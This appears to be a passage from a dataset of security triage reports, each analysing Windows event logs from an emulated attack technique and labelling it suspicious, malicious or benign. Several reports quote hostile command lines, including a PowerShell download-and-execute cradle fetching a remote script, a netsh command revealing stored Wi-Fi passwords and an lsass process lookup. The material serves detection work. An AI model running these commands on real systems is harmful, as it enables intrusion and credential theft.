   - Running executables from temporary directories, especially one named as suspiciously as this, can sometimes indicate malicious activity. However, without further context on the file `DirLister.exe`, it's challenging to definitively label it as malicious.

3. **Sysmon Log**:
   - Several process creation events (EventID 1) and process termination events (EventID 5) are logged. Many Microsoft and Edge update processes are running at a high integrity level as NT AUTHORITY\SYSTEM, which is expected for system processes.
   - The repeated execution of PowerShell with the `DirLister.exe` as seen previously in the PowerShell logs raises suspicion when coupled with its location and execution method (from a temporary directory via PowerShell).
   - Most other processes logged, including `svchost.exe`, `wermgr.exe`, and `taskhostw.exe`, are legitimate Windows processes executed under expected contexts.

### Assessment:
- **Suspicious Activities**:
  - **Execution of `DirLister.exe` from a temporary directory**: While this may indicate benign activity (such as a legitimate administrative script), the context of execution—from a temporary folder using PowerShell—aligns with common tactics used in malware deployment scenarios. It requires additional scrutiny, such as file integrity checks, source verification, and, if possible, reversing the contents of the executable.
  - **Use of PowerShell**: The scripting environment is often leveraged in attacks (e.g., fileless malware, living off the land binaries), amplifying concern due to the file's context.
  
- **Benign Activities**:
  - Majority of the Microsoft Edge Update events follow expected patterns for software updates.

### Conclusion:
Based on the analysis, we highlight the execution of `DirLister.exe` via PowerShell as **SUSPICIOUS**. It doesn't definitively point to malicious behavior, but the circumstances warrant further investigation to rule out potential compromise. 

### Recommended Next Steps:
- **Confirm the legitimacy** of the `DirLister.exe` file:
  - Check its origin and intended use. If it's unmanaged, consider isolation.
  - Perform dynamic and static analysis to examine its behavior.
- **Review administrative actions** performed on the server to understand if the PowerShell activity aligns with legitimate administrative tasks.
- Implement monitoring for further PowerShell activities, specifically those involving execution from temporary directories.

The current activity requires some follow-up but does not yet indicate a definitive threat."
Azure Security Scan with SkyArk,"### Detailed Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior Observed:
1. **PowerShell Execution with Unusual Script**:
   - Multiple entries from the Windows PowerShell logs show an execution of a script titled **AzureStealth.ps1** from a temporary directory. The script is loaded using `Import-Module` and is set up to run several commands aimed at interacting with Azure services (`Connect-AzAccount`, `Connect-AzureAD`, and `Scan-AzureAdmins`).
   - The script is using hardcoded credentials that are converted to a secure string and passed to `Connect-AzAccount` and `Connect-AzureAD`, suggesting that the script is designed to use specific credentials to access accounts or data in Azure.
   - The use of an unusual script with these operations is concerning, especially when the module's name (""AzureStealth"") suggests potential stealthy or unauthorized operations.

2. **Elevated Privileges**:
   - The security logs include an event (EventID 4672) indicating that the user `admin_test` was granted special privileges, including `SeDebugPrivilege`, which allows the user to debug and potentially manipulate other processes.
   - Other privileges include `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`, which can be indicative of actions necessary for system-level changes or exploitations.

3. **Sysmon Logs Indicate Executions**:
   - Sysmon logs highlight the execution of `powershell.exe` with the single goal of executing the aforementioned PowerShell script.
   - The logs also note the creation of several processes (`csc.exe` and `cvtres.exe`), which are typically related to compiling C# code and may suggest compilation of .NET code on the fly, consistent with custom or unauthorized code execution.

#### Events Indicating Possible Malicious Activity:
- The combination of executing a script titled `AzureStealth.ps1` from a temporary directory, using hardcoded credentials for Azure services, and the granting of extensive administrative privileges strongly suggest potentially malicious intentions.
- The use of encrypted commands indicates an attempt to obscure activity, making it a strong indicator of potential malicious actions.

#### Assessment of Situation:
The logs present several indicators of potentially malicious activity. The execution of `AzureStealth.ps1`, with its intent to access Azure resources with predetermined credentials, alongside the escalated privileges on the machine, suggest an adversarial attempt to gain information or further control within Azure environments.

#### Recommended Resolution:
- **Resolution**: **MALICIOUS**
- **Actionable Steps**:
  - Immediately isolate the affected host (Server002) to prevent potential lateral movement or further data exfiltration.
  - Conduct a thorough review of Azure access logs related to the `admin_test` account to ensure no unauthorized access has occurred.
  - Undertake a comprehensive forensic analysis of the affected host to identify any additional malware or indicators of compromise.
  - Revoke and rotate credentials for any accounts that were used or potentially targeted by the script.
  - Evaluate logging and alerting measures related to PowerShell executions to assist in detecting similar threats in the future."
System Discovery - SocGholish whoami,"**Detailed Analysis of Logs:**

1. **Security Log Review:**
   - Event ID 5379 pertains to credential validation operations. Notably, the return code `3221226021` appears consistently, indicative of a failed operation, which aligns with ""STATUS_NO_SUCH_LOGON_SESSION."" 
   - The repeated attempts suggest a potential automated process or script attempting to access or validate a series of credentials, perhaps indicative of a misconfiguration or erroneous script execution rather than a compromise given the association with `SERVER002$` (a system account).

2. **Sysmon Log Review:**
   - Multiple instances of normal system utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) executed by the `admin_test` account. These are common tools, but their frequent execution can imply scripted or automated processes running sessions to gather system information.
   - **Anomaly:** The execution of PowerShell with an embedded script that generates random character strings and redirects the output of `whoami.exe /all` to a temporary file appears suspicious. This pattern could be indicative of an attempt to mask unauthorized activity by dumping and analyzing user and group information.
   - The `PowerShell` session did not appear to execute further commands related to known attack techniques, but its usage is atypical and warrants additional scrutiny.

3. **Windows PowerShell Log Review:**
   - PowerShell scripts executed include mechanisms for random string generation and use of `whoami.exe /all`, suggesting enumeration activity. This activity attempts to write the output to a temporary file, which might denote a preparatory step for data exfiltration or internal reconnaissance.

4. **System Log Review:**
   - Windows Update activity including Microsoft Defender Antivirus updates is noted. This is typical for maintaining system security and does not appear directly related to malicious activity.

**Assessment:**
- **SUSPICIOUS:** The presence of frequent PowerShell executions, coupled with the script generating random filenames and the intent to output `whoami` data is irregular and deviates from normal administrative activities. This could potentially be a reconnaissance phase of attack activities, such as collecting user data or laying groundwork for privilege escalation.

**Resolution:**
- Conduct a follow-up investigation on the `admin_test` account's activities and logs, especially focusing on the PowerShell execution history.
- Monitor network traffic for anomalies that could suggest data exfiltration.
- Examine the temporary directory for any unexpectedly large or abnormal files that could be indicative of tampering or data collection.
- Ensure that endpoint protection (e.g., Defender) is fully operational and configured for real-time threat monitoring."
Discover Specific Process - tasklist,"**Detailed Analysis**

**Sysmon Log Analysis:**

- Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed by the user `SERVER002\admin_test`. The frequent execution of `wevtutil.exe`, a legitimate Windows utility used to manage event logs, in rapid succession could be suspicious if it’s being used to clear logs or perform other manipulations. However, the logs do not provide the specific command-line arguments used, so it's difficult to determine their intent solely from this log. Still, generally speaking, `wevtutil.exe` abuse is a known tactic for attackers to cover their tracks.

- The execution of `hostname.exe`, `whoami.exe`, and `cmd.exe` are standard utilities. However, the usage of `cmd.exe` with `tasklist | findstr lsass` suggests reconnaissance activities to identify the `lsass.exe` process, which could potentially lead to a credential dumping attempt. This behavior can be related to malicious intent if such commands are not typically used by administrators on this machine.

**System Log Analysis:**

- There is a time change event (`EventID 1`) by `svchost.exe`. The abrupt change of system time without a visible legitimate reason could indicate tampering, often associated with attempts to evade detection in event logs. This action corresponds with the timeframe of potentially suspicious activities seen in Sysmon logs.

**Application Log Analysis:**

- The `Software Protection Platform Service` log (`EventID 16384`) does not provide direct insight into suspicious activity but could be routine licensing checks.

**Security Log Analysis:**

- Log entries `EventID 4616` confirm the time change detected in the system logs.

**Windows PowerShell Log Analysis:**

- The absence of logs in this section limits further insights into any PowerShell-based compromises.

**Assessment of the Situation:**

The combination of frequent `wevtutil.exe` executions and processes performing reconnaissance (like checking `lsass.exe` with `tasklist | findstr`) alongside the system time changes suggest potentially malicious intent or activity.

**Identified Threats or Risks:**

1. Potential Log Tampering - Due to the usage of `wevtutil.exe` by `SERVER002\admin_test`.
2. Possible Reconnaissance or Credential Stealing Activity - Indicated by process examination commands targeting `lsass.exe`.
3. Time Tampering - Could be an attempt to evade chronological event logging.

**Guidance on How to Proceed:**

1. **Conduct a Full Investigation:**
   - Obtain and review the command-line activity of `wevtutil.exe` and `cmd.exe` for the precise commands used.
   - Check the user `SERVER002\admin_test` for unusual activities and authentication anomalies.

2. **Analyze System Integrity:**
   - Investigate any unauthorized access or signs of credential theft around the detected timeframe.
   - Ensure no unauthorized access to sensitive data or lateral movement within the network.

3. **Strengthen Security Posture:**
   - Implement stricter monitoring on the execution of sensitive system utilities like `wevtutil.exe`.
   - Alert on mismatched time changes and correlate with other security events.

**Final Resolution: SUSPICIOUS**

The activity detected requires further investigation due to signs that do not align with standard administrative practices, indicating potential malicious intent."
SharpHound3 - LocalAdmin,"Based on the analysis of the provided Windows event logs, here are the key observations:

### Security Logs:
1. **Event ID 4624 & 4672: Successful Logon and Special Privileges Assigned**:
   - Logon Type 5: This indicates a service logon, which is normal for system processes like `services.exe`.
   - Special privileges in Event ID 4672 are common for system processes.
   - No anomalous user activity or external IP addresses noted.

### Sysmon Logs:
1. **Execution of PowerShell via `admin_test` account**:
   - PowerShell was executed with command-line arguments potentially indicating a script execution that is not typical, especially referencing the TEMP directory for script execution (`New-Item -Path ""$env:TEMP\\script\\""`).
   - The presence of `script.exe` in a Temporary directory executed under PowerShell is suspicious as it could indicate an attempt to execute temporary or downloaded malicious scripts.

2. **Multiple `wevtutil.exe` and `conhost.exe` executions**:
   - These processes were executed by `admin_test`. `wevtutil.exe` is a legitimate Windows utility that interacts with event logs, but its execution in rapid succession alongside `conhost.exe` may suggest log manipulation or unclear purpose.

3. **External Executable in Temp Directory**:
   - The command line details in the PowerShell log show an executable (`script.exe`) from a path that includes suspicious directory traversal (`file\\..\\Externalfiles\\script.exe`), suggesting possible evasion or attempts to access files unexpectedly.

### Application Logs:
1. **Windows Defender**:
   - Windows Defender is ON, which is typically a good sign of an active security guard on the system.

### Windows PowerShell Logs:
1. **Executions with Suspicious Commands**:
   - PowerShell executed with a command that includes creating a directory and running a script meant for collecting data or performing actions (`--CollectionMethod LocalAdmin --NoSaveCache`), which is non-standard for routine system actions and points towards potentially unwanted operations.

### Assessment:
- There is a notable presence of PowerShell scripting executing commands that are suspicious in nature, especially the use of temporary directories and inclusion of an external executable.
- Frequent execution of `wevtutil.exe` in an unusual context might be indicative of attempts to interact with or manipulate event logs.

### Resolution:
- **Resolution**: **SUSPICIOUS**
- **Reason**: While there is no direct evidence of compromise, the use of PowerShell scripts with command-line arguments pointing to external executables in temp directories, and multiple rapid `wevtutil.exe` executions, suggest activities that require further investigation.
- **Guidance**: 
  - Isolate and monitor the `admin_test` account for further activity.
  - Review the specifics of scripts and executables in the TEMP directory.
  - Check for any signs of data exfiltration or further suspicious configurations on the system.
  - Conduct a thorough risk assessment of the system and strengthen PowerShell execution policies and logging."
Enumerate Stored Wi-Fi Profiles And Passwords via netsh,"Based on the analysis of the provided Windows event logs, here are the findings:

1. **Security Logs:**
   - Event ID 4616 indicates a time change event logged by svchost.exe. This can happen during legitimate synchronization with time servers.
   - Event ID 4634 signifies a logoff while 4624 indicates a successful logon. Both involve the user ""admin_test"", suggesting possible routine logon and logoff.
   - Event ID 4672 signals that ""admin_test"" was granted special privileges, including SeDebugPrivilege, which are typically necessary for system administration. However, the presence of multiple privileged entries in a short time frame could warrant further investigation.
   - Event ID 5379 reveals failed Credential Manager operations, which might indicate attempts to access stored credentials unsuccessfully.

2. **Sysmon Logs:**
   - We observe a series of executions of utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and multiple instances of `cmd.exe` and `netsh.exe`. The use of commands like `netsh wlan show profile * key=clear` is notable as it can retrieve stored Wi-Fi credentials, potentially indicative of unauthorized information gathering.
   - The presence of `cmd.exe` running with `/c netsh wlan show profile * key=clear` suggests its execution might be aimed at retrieving sensitive network information. This is suspicious behavior if not part of regular administrative tasks.

3. **Application Logs:**
   - Windows Defender status is logged as active, indicating that the system's security measures are enabled.

4. **System and Time Logs:**
   - The alteration in system time can be due to normal time synchronization (Event ID 1 and 24 in Kernel-General logs).
   - Regular Windows Update activity is noted for security intelligence updates, which are a typical system behavior to maintain defense measures.

**Assessment:**
- There are several indicators that suggest anomalous behavior, particularly focused on the potential unauthorized information gathering with the use of `netsh` command.
- The execution of typically benign processes (e.g., `whoami.exe` for user information, `wevtutil.exe` for event log management) along with attempts to list Wi-Fi profiles can arise during legitimate administrative tasks, although the context, timing, and account usage (an administrative account) might suggest otherwise.

**Resolution:**
- **SUSPICIOUS**: The activity within these logs appears suspicious due to the use of commands that could lead to unauthorized data access and privilege escalations. Moreover, the repetitive appearance of high-privilege events and failed credential accesses suggest the need for further investigation to determine the legitimacy and necessity of these actions.

**Guidance:**
- Further investigation should involve a deeper dive into recent actions taken by the `admin_test` account, monitoring for additional unauthorized command executions, and evaluating if these actions coincide with authorized administrative tasks.
- Consider implementing extended monitoring of administrative accounts and usage of commands that access stored credentials.
- Verify with system owners or administrators if these processes were executed as part of routine operations or maintenance."
Security Software Discovery - Sysmon Service,"Based on the provided Windows event logs, here is a detailed analysis:

### Security Log Analysis:
- **Event ID 4616** shows that the system time was changed. While time changes can be legitimate, it is also a known tactic for attackers to alter timestamps to cover their tracks. The time change was executed by the process `svchost.exe`, a legitimate Windows service host process. However, in a suspicious context, it could be involved in malicious activities.

### Sysmon Log Analysis:
- **Sysmon Event ID 5** repeatedly logs the execution of `wevtutil.exe` and `conhost.exe`. While `wevtutil.exe` is used to export, archive, and clear event logs, its frequent execution can be suspicious if there’s no known task requiring such regular log management. Moreover, `conhost.exe` is commonly used to host console applications, and it's suspicious when executed by a non-typical user or in an abnormal pattern.

- **Sysmon Event ID 1** shows several command-line executions:
  - **`cmd.exe` execution** with command `fltmc.exe | findstr.exe 385201` is particularly suspicious because it directly interacts with filter drivers, which is unusual for regular tasks and could indicate reconnaissance or alteration of system components.
  - **`whoami.exe` and `hostname.exe` executions** are typical tools for gathering user and system information. When executed in a sequence, it often suggests information gathering, which can be benign or precursor to further actions depending on the context.
  
- **Frequent execution of `MicrosoftEdgeUpdate.exe`**:
  - The logs indicate many instances where `MicrosoftEdgeUpdate.exe` is executed with various command-line parameters. This behavior could be typical if an update process is taking place. However, the frequency and diversity of parameters being used might necessitate verification against expected behavior for redundancy.

### Application and System Logs:
- **EdgeUpdate service logs** suggest usual update activities for Microsoft Edge. The service stopping messages could be routine processes during updates unless an inconsistency arises, which is not apparent from the logs.
- **Kernel-General and Time-Service logs** confirm time adjustments. These adjustments correspond to changes recorded in the Security logs, suggesting they are logged in correlation with Event ID 4616.

### Conclusion:
- There are a few activities that stand out:
  - **Frequent invocation of `wevtutil.exe`** and **execution of log management commands** without clear administrative tasks can indicate attempts to manage or obscure event log data.
  - **Command execution involving system filters** and **tools like `whoami` and `hostname`** are not typical for average operations but might be part of a script or automation task if done legitimately.

Given the findings and without additional context or corroborating evidence of known malicious indicators, the logs present signs of activity that are:
- **SUSPICIOUS** - Given the combination of log management, command-line tool executions for system information, and filter management, further investigation is warranted to determine legitimacy and context of these actions, especially focusing on user 'SERVER002\\admin_test' and any related administrative tasks they were performing at that time."
Remote System Discovery - net group Domain Controller,"Upon review of the provided Windows event logs across the different logs -- System, Sysmon, Security, and Application logs -- several events suggest potentially suspicious behavior that warrants further investigation. Below is a detailed analysis:

### System Log Analysis:
1. **Kernel-General Event (Shrink of Hive):**  
   - The event shows a reduction in size for a registry hive related to SYSTEM32\config\COMPONENTS. Changes in registry hives could indicate an attempt to alter or clean the registry, possibly to remove traces of activities, although non-malicious scenarios might also cause this.

2. **Time Service Configuration and Windows Update:**
   - Both time synchronization (time.windows.com) and Windows update activities look normal. Updating the system's security intelligence (Microsoft Defender Antivirus) is routine and typically benign.

### Sysmon Log Analysis:
1. **Execution of Admin Tools:**
   - **whoami.exe** is executed multiple times, which reports the current logged-on user. It could be normal for administrators, but frequent execution might suggest attempts to gather environment information.
   - **wevtutil.exe** is repeatedly logged. This utility can be used to query or modify event logs, which could be a sign of someone trying to manipulate or cover tracks in the event logs.
   - **cmd.exe** executing a command to list domain controllers: `net group /domain ""Domain controllers""`.
   - While these can be legitimate activities, especially in admin environments, the pattern and frequency, especially `cmd.exe` execution, can be considered suspicious.

2. **High Integrity Level and SYSTEM User Context:**
   - The frequent execution of system processes under high integrity levels aligns with administrative tasks, but amidst suspicious sequences, it might indicate a privileged escalation or misuse.
   
3. **Presence of conhost.exe:**
   - **conhost.exe** is often spawned by console applications. The frequency here is aligned with other administrative tasks being queried or configuration being checked. However, its presence with wevtutil.exe and cmd.exe warrants further exploration.

### Security Log Analysis:
1. **Logon Events and Credential Access:**
   - Security log entries don't directly show successful account compromises. Instead, a series of service-related account actions are visible without immediate relation to compromise, perhaps explaining domain-specific connectivity attempts.

### Application Log Analysis:
1. **Windows Defender:**
   - Reports state that Windows Defender is active, which helps mitigate direct immediate threats.

### Conclusion and Recommendations:
- Based on the detection of **cmd.exe** querying domain controllers and frequent use of **wevtutil.exe**, the presence of these actions signifies suspicious activity. Although there is no direct evidence of compromise from log entries, the behaviors suggest potentially unauthorized account enumeration or further reconnaissance actions.

**Resolution:** SUSPICIOUS

### Guidance on Ensuing Steps:
1. **Investigate User Activity:** Enquire or validate with the user 'admin_test' regarding recent actions to confirm if these were legitimate administrative operations.
2. **Examine User Privileges and Access Logs:** Check permissions, and scrutinize any irregularities in account permissions or long-term persistence strategies like adding to domain controllers or similar groups.
3. **Monitor Endpoint Security Measures:** Continue to thoroughly observe endpoint defenses, ensure they are up-to-date, and conduct deeper review on specific files like `cmd.exe` and `wevtutil.exe` for anomalies.
4. **Threat Hunting on Network:** Use network detection systems to look for unusual traffic, confirming if there is any information relay to external or suspicious IPs.

Engage further security tools aimed at anomaly detection and potentially initiating a formal incident response if corroborating evidence surfaces."
List Google Chrome - Opera Bookmarks on Windows with powershell,"After reviewing the provided logs, here is the analysis and assessment:

### Analysis

1. **Suspicious PowerShell Activity:**
   - A PowerShell process (`powershell.exe`) was executed with the command line: 
     ```powershell
     & {Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force}
     ```
   - This command is designed to search and list bookmark files within user directories, which might indicate unauthorized access or espionage behavior typically seen during reconnaissance phases of an attack. The command suppresses error messages and forces the action, which might indicate an attempt to avoid alerts or errors.

2. **System Processes and Executions:**
   - A series of standard Windows processes such as `hostname.exe`, `conhost.exe`, and `whoami.exe` were executed. These processes, while typically benign, could be used in sequence for reconnaissance.
   - There is an observed execution of `wevtutil.exe`, which is a command-line utility for managing event logs. This could potentially be leveraged for clearing logs as a means to cover tracks, but further context is needed to confirm any malicious use.

3. **Microsoft Edge Updates:**
   - Several executions related to Microsoft Edge update processes are logged, originating from `MicrosoftEdgeUpdate.exe` and related tasks in the `Temp` directory. These entries align with legitimate software update activity.

4. **Security and System Logs:**
   - The security logs show standard logon and privilege assignment events. No clear indications of unauthorized access or privilege escalation were observed in these logs.

5. **Other Logs:**
   - Events related to time changes (EventID 4616) and software protection (SPP events) appear normal and do not indicate malicious actions.

### Assessment

- **Suspicious Activity Detected**: The PowerShell command executed appears suspicious as it could be part of a reconnaissance tactic to search for sensitive information (e.g., bookmarks, which could indicate browsing history or saved references to sensitive resources).
- **No Clear Evidence of Compromise**: While the PowerShell command stands out, there is no direct evidence linking it to a specific compromise or attack vector, such as data exfiltration or privilege escalation.

### Guidance and Resolution

Given the current analysis:

- **Resolution**: **SUSPICIOUS**
- **Recommended Actions**:
  - Investigate the context leading to the PowerShell command execution. Determine whether the action was authorized or part of an administrative task.
  - Perform a thorough review of user accounts, permissions, and recent changes or additions that might correlate with the command activity.
  - Monitor network traffic for any abnormal outbound connections or data transfers that could suggest data exfiltration.
  - If deemed necessary, conduct a full security review or audit to rule out any further signs of compromise.

Further investigation is required to confirm whether the behavior is benign or part of a larger malicious activity."
Adfind -Listing password policy,"After analyzing the provided Windows event logs, here's the detailed assessment:

1. **Application Log**:
   - The events provide typical service-related logs with no unexpected applications or processes being executed. The stopping of ""edgeupdate"" and the state of Windows Defender appear to be related to regular updates and system checks, respectively. No anomaly or suspicious behavior is noted within these events.

2. **Security Log**:
   - Event ID 4624 and 4672 indicate a successful logon with elevated privileges for the SYSTEM account. While this could usually be regular system behavior, it can also be leveraged for privilege escalation if unauthorized access was initially obtained. However, no direct evidence of compromise through these specific logs is noted.

3. **Sysmon Log**:
   - There is extensive logging of processes related to ""MicrosoftEdgeUpdate.exe"" and its components performing standard operations associated with product updates. The logs capture process creations likely tied to Microsoft Edge maintenance tasks.
   - One noteworthy entry involves the execution of ""cmd.exe"" with a command referencing ""AdFind.exe."" This could indicate enumeration activities often used by attackers looking to gather information on Active Directory or in post-exploitation phases. This command flags attributes related to lockout policies and password settings, which can be used in reconnaissance activity.

4. **Indicators and Observations**:
   - **Potentially Suspicious Usage of AdFind**: The use of ""AdFind.exe"" with specific command parameters for querying sensitive directory attributes is unusual if not expected by the user or administrator. It is often a tool used in penetration testing but is also utilized maliciously for domain reconnaissance.

**Conclusion and Resolution**:
- Although the majority of activities related to Edge updates appear benign and consistent with routine operations, the execution of a command utilizing ""AdFind.exe"" is indicative of reconnaissance activities potentially signifying an intrusion or internal threat.
  
- **Resolution: SUSPICIOUS**
  - The logs feature suspicious activities that warrant further investigation. Detailed attention should be given to understanding the context of ""AdFind.exe"" usage. You should:
    - Verify any authorized administration or IT tasks that might involve using ""AdFind.exe.""
    - Conduct a network and host-based assessment to trace unauthorized access attempts or lateral movement.
    - Review other logs and historical data to identify access patterns and potential infiltration vectors.
    - Engage in a security review with the involved system admins or security team for further analysis and possible containment measures."
Enumerate All Network Shares with SharpShares,"Upon reviewing the provided Windows event logs from the Sysmon, Application, Windows PowerShell, and System logs, the analysis reveals several points of interest that could suggest suspicious activity:

1. **PowerShell Execution:**  
   - The log indicates a PowerShell command executing `SharpShares.exe` from a potentially hidden directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\SharpShares.exe`). The use of PowerShell to execute applications with embedded command lines in temporary directories is commonly seen in lateral movement and post-exploitation phases by attackers.
   - The command line also directs output to a file, which might be used by attackers to collect and exfiltrate data.

2. **Process Chaining and Command Execution:**
   - The execution flow shows PowerShell launching a command (`cmd.exe` which in turn executes `SharpShares.exe`). This chaining is often used to obscure the origins and intent of the original process.
   - `SharpShares.exe` is a known tool used for enumerating shared folders on a network, which fits the profile of an attacker gathering information about the environment.

3. **High Integrity Level Execution:**
   - The scripts and commands are executed with a high integrity level, indicating elevated privileges that may have been obtained through unauthorized means.

4. **User and Process Context:**
   - Actions performed by the user `SERVER002\\admin_test` without clear administrative task context are questionable. The user might be compromised, or an adversary is using this account for continued access.

5. **Unusual File Locations:**
   - Executables are being run from the `AppData\\Local\\Temp` directory, which is untypical for benign processes.

Overall, the pattern of using PowerShell with a high integrity level, execution of potentially aggressive network enumeration tools (`SharpShares.exe`), and the chaining of execution flows through PowerShell, command prompt, and temporary directories strongly point towards unauthorized or aggressive reconnaissance activity within the network.

### Conclusion
**Resolution: SUSPICIOUS**

The behavior observed in these logs is not typical for benign administrative activities, and it aligns closely with tactics used in network reconnaissance and privilege escalation during an attack. Further investigation is warranted. Immediate steps should include:

- Conducting a thorough review of the administrative account `admin_test` for unauthorized use.
- Implementing additional monitoring and restrictions on PowerShell execution.
- Inspecting network shares and directory permissions to secure any sensitive data.
- Checking for any unauthorized access or modification of critical systems and resources.

The goal is to determine if this is part of a legitimate workflow that has not been documented, or if it is the result of an intrusion into the server."
Process Discovery - Process Hacker,"After analyzing the provided Windows event logs from the PowerShell, Security, and Sysmon logs, I have identified several points of interest and potential concerns:

### PowerShell Log Analysis:
- **Process Execution**: A PowerShell command executed `ProcessHacker.exe` using `Start-Process`, as seen in the PowerShell event logs. This tool, ""Process Hacker,"" is often used by both system administrators for process management and attackers for process manipulation due to its ability to terminate processes and elevate privileges.
- **Command Execution**: The command `powershell.exe & {Start-Process -FilePath ""$Env:ProgramFiles\Process Hacker 2\ProcessHacker.exe""}` was executed, indicating an attempt to start Process Hacker from within a PowerShell session. 

### Security Log Analysis:
- **Privileged Operations**: Security event log that indicates it was triggered by `C:\Program Files (x86)\Microsoft\EdgeUpdate\Install\...`, which may align with a normal scheduled task for Edge updates. However, the timing or other context might need further verification to discard anomalies.

### Sysmon Log Analysis:
- **High-Integrity Execution**: Windows PowerShell was executed with high integrity, and processes like `whoami.exe` and `hostname.exe` are a part of normal system operations. However, the repetitive launch of various system utilities in conjunction with the Process Hacker execution indicates potential anomalous behavior worth further investigation.
- **SecureBootEncodeUEFI.exe Execution**: While this process is legitimate, any execution related to Secure Boot should be verified to ensure it aligns with expected operations, particularly given the higher integrity level associated with system processes.
- **wsmprovhost.exe Activity**: This is a host process for Windows services, but it can also be a concern if misused. The presence of related processes without clear administrative-centric commands seems non-malicious but might require context around the exact operational requirements.

### Assessment and Recommendation:
- **Anomalous Behavior**: The execution of Process Hacker through PowerShell without a clear administrative task indicates suspicious behavior. This tool can modify processes and escalate privileges, which is often a red flag in environments where its use is not logged and verified.
- **Further Investigation**: Validation of any scheduled task linked to Microsoft Edge updates and further analysis of any existing whitelistings for Process Hacker should be conducted. Additionally, a review of user accounts and their privileges would clarify legitimate or unauthorized access if applicable.

### Resolution:
Given the analysis above, the logs contain suspicious activity primarily due to the use of Process Hacker in a possibly unauthorized manner. While there's potential for legitimate use, further investigation is needed to confirm its origin and legitimacy.

**Resolution: SUSPICIOUS** - The logs contain activity that is unusual and warrants deeper investigation to rule out any unauthorized or malicious actions. Ensure that any use of process manipulation tools aligns with documented administrative actions and that all user permissions are accurate."
Network Share Discovery PowerShell,"The logs from the Windows system reveal a series of events associated with common system activities, updates, and some usage of PowerShell. To assess whether there is any malicious activity, I have analyzed the logs for key indicators:

1. **PowerShell Activity:**
   - The PowerShell logs indicate the execution of a command `powershell.exe & {get-smbshare}`. This command retrieves information about shared SMB resources on the network. Without further context or additional suspicious commands, this PowerShell usage does not inherently indicate malicious intent. However, unauthorized use of PowerShell can be indicative of scouting for lateral movement by an attacker.

2. **Sysmon Logs:**
   - There are several events related to the execution of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`). These events appear consistent with legitimate software update activity, with processes running under the `NT AUTHORITY\SYSTEM` account. The presence of update-related processes (`MicrosoftEdgeUpdate.exe` and its various command-line options like `/svc`, `/c`, etc.) running is standard during system or application update processes.

3. **Command and Application Execution:**
   - The presence of `conhost.exe` and `whoami.exe` being executed by an account `SERVER002\admin_test` seems typical. The use of `whoami.exe` is often used to check current user identity but is typical for administrative or script-related tasks. 
   - The execution of `sppsvc.exe`, related to software protection service, and `TiWorker.exe`, a Windows update related process, supports ongoing system maintenance activities.

4. **Additional Observations:**
   - The logs indicate various processes running with standard Windows integrity levels and domains (such as `SYSTEM` and `NETWORK SERVICE`). 
   - The events are primarily related to routine tasks like system updates and basic PowerShell command execution without further escalation, exfiltration, or suspicious scripting.

**Assessment:**
- **Resolution: BENIGN**

The windows event logs display behavior typical of routine system maintenance and administrative activities. There are no evident malicious activities such as suspicious file execution, privilege escalations, or unauthorized network communications. However, it is good practice to verify the source or context under which the PowerShell script was executed, as well as reviewing any relevant security policies.

**Guidance on How to Proceed:**
- Continue to monitor PowerShell execution logs for complexity or attempt at privilege escalation.
- Ensure that the `admin_test` account and others with high privileges are legitimate and their activities aligned with expected administrative tasks.
- Maintain system patches and updates up-to-date to ensure that legitimate processes aren't exploited."
WinPwn - RBCD-Check,"Based on the log entries provided, I've identified the following key points and potential indicators of malicious activity:

1. **PowerShell Activity**: 
   - There is a PowerShell execution with the command line including a direct invocation to download and execute a script from a remote GitHub repository: 
     ```
     ""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), RBCD-Check -consoleoutput -noninteractive}
     ```
   - The use of `iex(new-object net.webclient).downloadstring()` is a known technique used to download and execute scripts from the internet. This behavior is suspicious and potentially malicious as it may be used to introduce malware or execute unauthorized scripts on the host.

2. **High Privileges**:
   - The account `SERVER002\admin_test` has high integrity level and is associated with privilege escalation. Specifically, the account has privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which can be concerning if abused.

3. **Network Logon Event**:
   - Event ID 4624 indicates a successful login using the NTLM authentication package, which could be normal activity but should be reviewed, especially in conjunction with suspicious PowerShell activity and high privilege use.

4. **Execution of Utilities**:
   - Execution of legitimate Windows utilities such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. While these can be benign, in combination with the PowerShell activity, they could suggest reconnaissance or preparatory steps for malicious actions.

5. **Console Host Execution**:
   - The frequent execution of `conhost.exe` might be connected to subprocesses of benign executables, but its usage pattern should be analyzed further considering the suspicious contexts.

### Assessment:
The combination of these activities - particularly the PowerShell script execution from a remote source along with an admin account with elevated privileges - raises a potential red flag. While some activities (like whoami or hostname executions) could be considered benign in isolation, the remote script execution indicates possible malicious activity.

### Resolution:
- **Resolution**: MALICIOUS

### Guidance:
1. **Immediate Action**:
   - **Quarantine the Host**: Isolate the affected system from the network to prevent further execution of the potential malicious script.
   - **Analyze the Script**: Download and analyze the content of the script `script.ps1` from GitHub if it has not been deleted/replaced, to understand its intent and impact.
   
2. **Investigation**:
   - Conduct a full forensic investigation of the machine to check for persistence mechanisms, data exfiltration, or compromised accounts.
   - Review other devices and network traffic for indicators of similar compromise or lateral movement.

3. **Mitigation and Prevention**:
   - Implement network defenses that prevent unauthorized scripts from being downloaded and executed.
   - Limit accounts with high privileges and monitor their activities closely.
   - Conduct regular security awareness training to ensure users are aware of the risks involved with executing scripts and downloading files from the internet.

These steps will help contain and understand the breach while reinforcing preventative measures to mitigate future risk."
Remote System Discovery - net,"Based on the analysis of the provided logs, several observations can be made:

1. **System and Application Logs:**
   - The logs indicate normal system activity, such as timezone updates and Windows updates for Microsoft Defender Antivirus. 
   - Security Intelligence updates (KB2267602) are routinely processed through the Windows Update Client, which aligns with standard Windows maintenance routines.

2. **PowerShell Logs:**
